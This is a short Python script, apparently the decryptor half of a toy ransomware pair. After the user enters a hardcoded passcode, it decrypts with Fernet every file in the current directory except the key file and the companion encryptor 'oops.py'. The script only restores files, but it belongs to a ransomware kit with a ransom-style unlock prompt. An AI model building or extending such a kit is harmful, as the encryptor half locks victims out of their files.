#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

files = []                              #create our list

for file in os.listdir():               #list file in .
    if file == "oops.py" or file == "thekey.key" or file == "decrypt.py":         # do not list this file
        continue
    if os.path.isfile(file):            #onlu files
        files.append(file)              # append them to the list
print(files)


with open("thekey.key", "rb") as key:
    secretkey = key.read()

secretphrase = "2022"

user_phrase = input("Enter the secret passcode to decrypt your files :)\n")

if user_phrase == secretphrase:
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
        print("Congrats, your files are decrypted. Enjoy\n")
else:
    print("Wrong passcode :(\n")
